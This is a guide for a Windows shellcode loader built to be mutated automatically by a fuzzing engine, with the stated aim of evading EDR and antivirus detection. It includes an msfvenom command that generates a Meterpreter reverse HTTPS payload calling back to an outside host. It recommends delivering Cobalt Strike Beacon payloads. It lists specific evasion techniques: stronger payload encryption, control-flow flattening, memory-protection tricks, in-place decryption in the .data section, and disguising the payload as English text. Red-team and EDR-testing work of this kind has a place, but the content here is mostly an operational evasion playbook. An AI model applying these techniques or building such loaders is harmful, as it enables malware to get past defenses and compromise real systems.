# AutoMutate++ Integration Guide: SuperMega Loader

This package provides a simplified, standalone C implementation of the SuperMega shellcode loader, optimized for direct integration with the AutoMutate++ fuzzing engine.

## 📁 Package Structure

| File | Purpose |
| :--- | :--- |
| `loader.c` | **Main Artifact**. The source code for the loader. Modular C code ready for AST mutation. |
| `payload.h` | **Data Source**. Contains the encrypted payload and protection keys. Generated by `encoder.py`. |
| `encoder.py` | **Utility**. Encrypts raw shellcode (e.g., `calc.bin`) into `payload.h`. |
| `build.sh` | **Build Script**. Compiles the project using Clang/LLVM for Windows x64 targets. |

## 🚀 Quick Start

1.  **Generate Payload**:
    ```bash
    # Creates payload.h from your raw shellcode
    python encoder.py --input data/binary/shellcodes/calc.bin
    ```
2.  **Build**:
    ```bash
    ./build.sh
    # Outputs: loader.exe
    ```
3.  **Run**:
    Execute `loader.exe` on a Windows test VM.

## 🧬 Integration with Mutation Engines

### 1. Source Injection (Pre-Process)
Since `loader.c` is standard C, your mutation engine can parse it into an AST (Abstract Syntax Tree) before compilation.

*   **Step A**: Parse `loader.c` using Clang AST Matchers.
*   **Step B**: Identify target functions (`antiemulation`, `main`).
*   **Step C**: Apply mutations (see below).
*   **Step D**: Emit modified C code or compile directly from LLVM IR.

### 2. Instrumentation (LLVM Pass)
Insert `TraceMode::Lines` instrumentation during the `clang` compile step in `build.sh`.
*   **Goal**: Track which blocks are executed.
*   **Success Metric**: Reaching the final `(*(void(*)())(dest))();` call without crashing/exiting implies the loader successfully evaded static and dynamic checks up to execution.

## 💣 Payload Strategy & Selection

### The "Loader vs Payload" Dichotomy
AutoMutate++ primarily targets **Loader Evasion** (Behavioral), not Payload Evasion (Memory/Signature).

*   **Fail Type A (Loader Caught)**: Process dies *before* payload runs.
    *   *Cause*: `VirtualAlloc` heuristics, Anti-Emulation timeout, Static Signature on `loader.exe`.
    *   *Result*: **MUTATION FAILED**.
*   **Fail Type B (Payload Caught)**: Process executes payload, then dies.
    *   *Cause*: EDR memory scanner finds `CobaltStrike` signature in the decrypted heap.
    *   *Result*: **MUTATION SUCCESS** (for Phase 1). The loader did its job.

### Recommended Payloads
To maximize test coverage, use these payload types to stress different EDR components.

| Case | Payload Type | Description | Goal |
| :--- | :--- | :--- | :--- |
| **Control** | `calc.bin` | Spawns `calc.exe`. | **Baseline**. If this fails, your loader is fundamentally broken or triggered a strict "Behavior:Win32/ProcessCreate" rule. |
| **Network** | `Meterpreter Reverse HTTPS` | Connects back to C2. | **Behavioral Trigger**. Tests if EDR blocks the *connection* or the *loader*. Distinct network flag allows verifying "Fail Type B". |
| **Memory** | `Cobalt Strike Beacon` | Full Beacon shellcode. | **Memory Trigger**. Known static signature in RAM. Tests if the Loader can deliver a "hot" payload without triggering "Write-Watch" heuristics. |
| **Entropy** | `Random Bytes` | 4KB of random data. | **Entropy Trigger**. Tests if EDR flags the memory region purely based on High Entropy (Shannon > 7.5) regardless of content. |

### How to Switch Payloads
1.  Generate raw shellcode (e.g., using `msfvenom` or CS).
    ```bash
    msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.0.0.1 LPORT=443 -f raw -o meterpreter.bin
    ```
2.  Encode it into the package:
    ```bash
    python encoder.py --input meterpreter.bin
    ```
3.  Rebuild:
    ```bash
    ./build.sh
    ```

## 🧪 Mutation Strategies

This loader is designed with "Genes" (Functions) that can be mutated independently.

### Module 1: Anti-Emulation (`antiemulation()`)
*Goal: Exhaust emulator resources or crash poor emulators without triggering "Evasion" heuristics.*

*   **🌀 Loop Mutation**:
    *   *Current*: Fixed 5 iterations.
    *   *Idea*: Randomize loop count based on a system variable (e.g., `GetTickCount() % 10`).
*   **🧠 Logic Mutation**:
    *   *Current*: `VirtualAlloc` -> Write -> Free.
    *   *Idea*: Use complex math (Prime Number calculation) instead of memory allocation. AV emulators hate strict math loops.
*   **⚠️ API Swap**:
    *   Replace `VirtualAlloc` with `HeapAlloc`, `GlobalAlloc`, or `LocalAlloc`.

### Module 2: The Decoder (`main`)
*Goal: Hide the payload without the decryption loop itself becoming a signature.*

*   **🔑 Key Mutation**:
    *   *Current*: 2-byte XOR (`0xAA`, `0xBB`).
    *   *Idea*: Upgrade to AES (using Windows APIs `CryptDecrypt`), RC4, or a custom rolling XOR key.
*   **🕸️ Control Flow Flattening**:
    *   *Idea*: Use LLVM Obfuscator rules to "flatten" the `for` loop, making the XOR logic harder to visualize in a graph.

### Module 3: Carrier Logic (`main`)
*Goal: Allocate executable memory without triggering "RWX" or "RW->RX" alarms.*

*   **🕵️ Memory Allocation**:
    *   *Current*: `VirtualAlloc(RW)` -> Decrypt -> `VirtualProtect(RX)`.
    *   *Idea 1 (Staged)*: `VirtualAlloc(RW)` -> Decrypt -> `VirtualProtect(R)` -> Exception Handler catches access -> `VirtualProtect(RX)`.
    *   *Idea 2 (Mapping)*: Use `CreateFileMapping` / `MapViewOfFile` to allocate memory backed by the pagefile (looks more legitimate).
    *   *Idea 3 (Image Spoofing)*: **Self-Modification**. Instead of allocating *new* memory, unprotect the `.data` section (where `payload` lives), decrypt in place, and repacking as RX.
        *   *Function*: `VirtualProtect(&supermega_payload, len, RW) -> Decrypt -> VirtualProtect(&supermega_payload, len, RX)`.
        *   *Benefit*: Avoids `VirtualAlloc` entirely. Memory scan shows payload inside a valid module (".data" or ".text"), not floating in a "Private" heap.

### Module 4: Payload Data (`payload.h`)
*Goal: Ensure the static data doesn't look like high-entropy randomness (which is suspicious).*

*   **🎭 Encoding**:
    *   *Current*: XOR (High Entropy).
    *   *Idea*: Encode as English text (e.g., using a Dictionary mapping). The payload looks like a Shakespeare poem until decoded.
